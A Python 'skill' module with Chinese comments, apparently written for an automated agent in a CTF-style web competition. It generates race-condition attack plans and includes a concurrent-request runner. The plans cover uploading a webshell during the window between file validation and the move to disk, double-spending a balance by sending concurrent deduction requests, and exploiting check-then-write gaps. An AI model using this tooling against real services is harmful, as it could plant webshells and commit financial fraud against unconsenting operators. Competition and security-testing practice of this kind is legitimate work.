"""web_race_condition skill：web 条件竞争利用模板。

场景（正式赛 web 升级方向）：
1. 上传竞态：校验文件内容后 delay 再落盘 → 校验期间用符号链接/替换文件绕过
2. 双花竞态：扣余额/发货有 check-then-act 窗口 → 并发请求双花
3. 校验竞态：先校验后写库，校验与写入间可并发插入

用法（skill 调用）：
    params = {'target_url': ..., 'kind': 'upload_race|balance_race|check_race',
              'concurrency': 20, 'payload': ...}
"""

import asyncio


def build_upload_race_plan(upload_url: str, field: str = "file") -> dict:
    """上传竞态计划：并发上传同一文件 + 立即访问，利用校验-移动窗口。"""
    return {
        "kind": "upload_race",
        "upload_url": upload_url,
        "field": field,
        "note": "并发 N 次上传同一文件（校验通过但移动前被覆盖为恶意内容），"
                "同时并发 GET 目标路径抓取落盘瞬间——需多次尝试 + 观察响应差异",
        "steps": [
            "1. 正常上传一次，记录返回路径/校验行为（是否校验内容/MIME）",
            "2. 构造恶意内容（webshell/脚本），并发 N=20 次上传同文件名",
            "3. 并发 GET 返回路径，抓取校验通过后移动前的窗口",
            "4. 观察是否有一次响应为执行结果（webshell 生效）",
        ],
    }


def build_balance_race_plan(api_url: str) -> dict:
    """双花竞态计划：并发扣款/转账请求利用 check-then-act 窗口。"""
    return {
        "kind": "balance_race",
        "api_url": api_url,
        "note": "目标接口若先查余额再扣减（非原子），并发 N 请求可全部通过校验",
        "steps": [
            "1. 正常请求一次，确认接口行为（查余额→扣减）",
            "2. 并发 N=30 相同请求（余额足够 1 次但不够 N 次）",
            "3. 检查是否多笔成功（双花）",
        ],
    }


async def run_race(requests_fn, target_url: str, concurrency: int = 20, **kwargs) -> dict:
    """执行并发竞态请求（requests_fn: async fn(url, **kwargs) -> 响应）。

    返回所有响应的状态码分布与是否出现异常响应（竞态窗口特征）。
    """
    async def _one(_i):
        try:
            return await requests_fn(target_url, **kwargs)
        except Exception as exc:
            return f"ERR:{type(exc).__name__}"

    results = await asyncio.gather(*[_one(i) for i in range(concurrency)])
    from collections import Counter

    statuses = Counter()
    for r in results:
        statuses[str(r)[:50]] += 1
    return {"concurrency": concurrency, "response_dist": dict(statuses),
            "race_window_hit": len(statuses) > 2,  # 多态响应 = 竞态窗口迹象
            "samples": [str(r)[:80] for r in results[:3]]}


def web_race_condition(params: dict) -> dict:
    """skill 入口：返回条件竞争利用计划（按 kind）。"""
    kind = params.get("kind", "")
    url = params.get("target_url", "")
    if kind == "upload_race":
        return {"ok": True, "plan": build_upload_race_plan(url)}
    if kind == "balance_race":
        return {"ok": True, "plan": build_balance_race_plan(url)}
    return {"ok": True, "plan": {
        "note": "通用条件竞争：确认目标接口是否存在 check-then-act 窗口（非原子操作），"
                "然后并发请求观察多态响应",
        "steps": ["1. 单次请求确认行为", "2. 并发 N 请求", "3. 分析响应差异"],
    }}


def run(params):
    """SkillManager 统一入口：转发到业务函数。"""
    return web_race_condition(params)


def main() -> None:
    import argparse

    parser = argparse.ArgumentParser(description="web 条件竞争模板")
    parser.add_argument("--kind", default="", help="upload_race|balance_race")
    parser.add_argument("--url", default="", help="目标 URL")
    args = parser.parse_args()
    import json

    print(json.dumps(web_race_condition({"kind": args.kind, "target_url": args.url}),
                     ensure_ascii=False, indent=1))


if __name__ == "__main__":
    main()
